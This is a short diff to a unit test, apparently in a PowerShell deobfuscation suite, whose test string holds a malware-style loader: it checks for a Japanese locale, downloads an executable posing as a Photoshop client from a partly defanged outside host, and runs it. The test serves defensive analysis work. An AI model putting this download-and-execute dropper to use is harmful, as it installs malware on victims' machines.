@@ -532,10 +532,11 @@ class TestPs1RealWorldLarge(TestUnitBase):
             $sK = Get-Culture | Format-List -Property * | Out-String -Stream
             if ($SK -Match 'ja') {
               $G7E = "${env:Temp}\NGLClient_Photoshop120.0.5.exe"
+              $Cf = '[[URL]]'
             } else {
               exit
             }
-            $hb.DownloadFile('[[URL]]', $G7E)
+            $hb.DownloadFile(($Cf), $G7E)
             . ($G7E)
             '''
         ).replace('[[URL]]', 'https:''//firedron''.top/uploads/IMG0065.jpg')
